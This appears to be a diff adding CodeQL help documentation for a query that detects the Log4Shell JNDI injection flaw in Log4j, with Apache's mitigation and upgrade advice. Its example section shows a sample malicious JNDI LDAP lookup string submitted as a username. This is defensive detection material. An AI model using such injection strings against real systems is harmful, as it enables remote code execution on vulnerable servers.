@@ -1,0 +1,53 @@
+<!DOCTYPE qhelp PUBLIC
+"-//Semmle//qhelp//EN"
+"qhelp.dtd">
+<qhelp>
+
+<overview>
+<p>
+Log4j versions prior to 2.15.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.
+</p>
+<p>
+As per Apache's Log4j security guide: Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters 
+do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or 
+log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. 
+From log4j 2.15.0, this behavior has been disabled by default.
+</p>
+</overview>
+
+<recommendation>
+<p>
+This issue was remediated in Log4J v2.15.0. The Apache Logging Services team provides the following mitigation advice:
+</p>
+<p>
+In previous releases (>=2.10) this behavior can be mitigated by setting system property "log4j2.formatMsgNoLookups" to “true” 
+or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). 
+Java 8u121 protects against RCE by defaulting "com.sun.jndi.rmi.object.trustURLCodebase" and "com.sun.jndi.cosnaming.object.trustURLCodebase" to "false".
+</p>
+<p>
+You can manually check for use of affected versions of Log4J by searching your project repository for Log4J use, which is often in a pom.xml file.
+</p>
+<p>
+Where possible, upgrade to Log4J version 2.15.0. If you are using Log4J v1 there is a migration guide available.
+</p>
+<p>
+Please note that Log4J v1 is End Of Life (EOL) and will not receive patches for this issue. Log4J v1 is also vulnerable to other RCE vectors and we 
+recommend you migrate to Log4J 2.15.0 where possible.
+</p>
+<p>
+If upgrading is not possible, then ensure the -Dlog4j2.formatMsgNoLookups=true system property is set on both client- and server-side components.
+</p>
+</recommendation>
+
+<example>
+<p>In this example, a username, provided by the user, is logged using <code>logger.warn</code> (from  <code>org.apache.logging.log4j.Logger</code>). 
+  If a malicious user provides <code>${jndi:ldap://127.0.0.1:1389/a}</code> as a username parameter, 
+  Log4j will make a JNDI lookup on the specified LDAP server and potentially load arbitrary code. 
+</p>
+<sample src="Log4jJndiInjection.java" />
+</example>
+
+<references>
+<li>GitHub Advisory Database: <a href="https://github.com/advisories/GHSA-jfh8-c2jp-5v3q">Remote code injection in Log4j</a>.</li>
+</references>
+</qhelp>
